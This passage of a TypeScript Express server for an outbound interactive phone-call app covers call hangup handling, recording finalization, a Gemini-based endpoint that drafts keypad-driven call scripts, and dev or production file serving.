      session.status = action === 'decline' ? 'busy' : 'completed';
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: action === 'decline' ? 'Recipient Declined Call' : 'Call Terminated (Hangup)',
        description: `User pressed end call.`,
      });
      void finalizeCallRecording(session);
      break;

    default:
      return res.status(400).json({ error: `Unknown simulator action: ${action}` });
  }

  res.json({ success: true, session });
});

// Hangup endpoint from dashboard
app.post('/api/call/hangup', async (req: Request, res: Response) => {
  const { callId, customTwilio, carriersConfig = {} } = req.body;
  const session = getSessionById(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  session.status = 'completed';
  session.pendingDigits = undefined;
  session.activeCue = undefined;
  session.completedAt = new Date().toISOString();

  addSessionEvent(session, {
    type: 'call-state',
    title: 'Call Terminated by Dashboard Operator',
    description: 'Operator pressed End Call button in web console.',
  });

  await terminateCarrierCall(session, customTwilio, carriersConfig);
  void finalizeCallRecording(session, customTwilio, carriersConfig);

  res.json({ success: true, session });
});

// Optional Gemini API endpoint for AI script optimization
app.post('/api/ai/enhance-script', async (req: Request, res: Response) => {
  try {
    const { prompt, useCase = 'appointment' } = req.body;
    const rawApiKey = (process.env.GEMINI_API_KEY || '').trim();
    const apiKey = rawApiKey && rawApiKey !== 'MY_GEMINI_API_KEY' ? rawApiKey : '';

    if (!apiKey) {
      return res.status(400).json({
        error: 'Gemini API key is not configured in environment. You can enter scripts manually.',
      });
    }

    const ai = new GoogleGenAI({ apiKey });
    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: `You are an expert telephony UX scriptwriter. Create an outbound interactive phone call script with clear DTMF options.
User Request / Context: "${prompt}"
Use case category: "${useCase}".

Return ONLY valid JSON with this exact schema:
{
  "script": "The spoken voice prompt that will be read aloud to the recipient by text-to-speech. Must end with clear instructions like: Please press 1 to confirm, press 2 to reschedule, or press 9 to speak with an agent.",
  "keypadActions": {
    "1": "Short label for 1 (e.g. Confirmed)",
    "2": "Short label for 2 (e.g. Reschedule)",
    "9": "Short label for 9 (e.g. Support)"
  },
  "recommendedVoice": "Polly.Joanna" or "Polly.Matthew"
}`,
    });

    const text = response.text || '';
    const cleanJson = text.replace(/```json\n?|\n?```/g, '').trim();
    const parsed = JSON.parse(cleanJson);
    res.json(parsed);
  } catch (err: any) {
    console.error('AI script enhancement error:', err);
    res.status(500).json({ error: err.message || 'Failed to generate AI script' });
  }
});

// Mount Vite or static production files
async function startServer() {
  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`VoiceDrop Interactive server running on port ${PORT}`);
  });
}

startServer();
